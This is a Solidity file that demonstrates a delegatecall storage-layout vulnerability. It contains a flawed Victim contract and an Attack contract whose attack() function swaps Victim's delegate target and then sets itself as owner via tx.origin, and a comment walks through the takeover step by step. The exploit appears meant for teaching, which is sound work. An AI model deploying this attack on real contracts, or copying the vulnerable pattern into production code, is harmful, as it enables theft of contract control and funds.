// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

/*
storage layout must be the same for the contract calling delegatecall and the contract getting called but
here this rule isn't obeyed and attacker use this Vulnerability to hack the contract :
1) John deploys Base first and then Victim with the address of Base as constructor input
2) Marry that is hacker deploys Attack with the address of Victim as constructor input 
3) Marry calls attack()
  result => Marry becomes the owner of Victim contract 
*/

contract Base {
    // storage layout isn't the same as Victim
    uint public num1 ;
    uint public num2 ;

    function setNumber(uint _num) public {
        num2 = _num;
    }
}

contract Victim {
    uint public num3 ;
    address public base;
    uint public num4 ;
    address public owner;
    

    constructor(address _base) {
        base = _base;
        owner = msg.sender;
    }

    function setNumber(uint _num) public {
        base.delegatecall(abi.encodeWithSignature("setNumber(uint256)", _num));
    }
}

contract Attack{   
    // storage layout should be the same as Victim so we can update Victim variables correctly 

    uint public num5 ;
    address public base;
    uint public num6 ;
    address public owner;
    address public ownerAddr ;

    Victim public victim ;
    constructor(Victim _victim){
        victim = _victim ;
        ownerAddr = msg.sender ;
    }

    function attack() public {
        require(msg.sender == ownerAddr ,"only owner ") ;
        uint _num = uint256(uint160(address(this)));
        victim.setNumber(_num);                           // this contract becomes the base contract in Victim
        victim.setNumber(0) ;          // pass any number as input

        // this function will cause setNumber() to be called
    }

    function setNumber(uint _num) public {   // changes the owner of Victim
        owner = tx.origin ;
    }
}

